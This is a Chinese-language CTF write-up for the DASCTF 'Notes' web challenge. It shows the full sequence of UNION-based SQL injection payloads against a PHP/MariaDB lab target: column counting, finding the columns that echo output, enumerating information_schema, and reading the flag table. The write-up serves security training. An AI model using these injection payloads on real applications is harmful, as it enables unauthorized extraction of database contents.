---
title: 'DASCTF - Notes (SQL注入 UNION)'
date: '2026-07-19T00:00:00Z'
modifiedTime: '2026-07-19T00:00:00Z'
intro: '来源：http://c2e6e00983b3879499b5e004.http-ctf2.dasctf.com:80'
tags: ['ctf', 'writeup', 'cve', 'sql注入', 'php']
cover: ''
---
# DASCTF - Notes (SQL注入 UNION)

> 来源：http://c2e6e00983b3879499b5e004.http-ctf2.dasctf.com:80
> 分类：Web
> 技巧：UNION-based SQL Injection

## 信息收集

访问根路径 `/`，服务器 302 跳转到 `index.php?id=1`，返回一个笔记页面。

关键信息：
- **Server**: openresty
- **X-Powered-By**: PHP/5.5.9-1ubuntu4.29
- **数据库**: MariaDB 5.5.64

## 漏洞探测

传入 `id=1'`，页面返回空白内容（header 和 p 标签均为空），确认存在 SQL 注入。

## 注入流程

### 1. 判断列数

```
?id=1' order by 3--    → 正常回显
?id=1' order by 4--    → 空白
```

共 **3 列**。

### 2. 定位回显列

```
?id=-1' union select 1,2,3--
```

页面显示：
- header: `2`
- p: `3`

第 2、3 列有回显。

### 3. 获取数据库信息

```
?id=-1' union select 1,database(),version()--
```

- 数据库名: `note`
- 版本: `5.5.64-MariaDB-1ubuntu0.14.04.1`

### 4. 获取表名

```
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--
```

表名: `fl4g,notes`

### 5. 获取列名

```
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='fl4g'--
```

列名: `fllllag`

### 6. 读取 Flag

```
?id=-1' union select 1,fllllag,3 from fl4g--
```

## Flag

```
n1book{union_select_is_so_cool}
```
